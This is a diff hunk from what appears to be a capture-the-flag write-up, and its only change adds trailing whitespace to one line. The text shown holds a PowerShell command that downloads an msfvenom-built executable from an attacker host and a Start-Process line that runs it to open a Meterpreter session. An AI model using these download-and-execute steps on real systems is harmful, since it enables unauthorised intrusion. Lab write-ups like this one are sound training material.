@@ -107,7 +107,7 @@ Make sure that your payload matches from your `msfvenom` or, guess what.  It won
 
 Once that's running, back to our powershell instance.  We use the following commands to get our meterpreter going.
 
-`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.x.x.x:80/alfred.exe','alfred.exe')"`
+`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.x.x.x:80/alfred.exe','alfred.exe')"`  
 `Start-Process alfred.exe`
 
 In our Metasploit console we get...
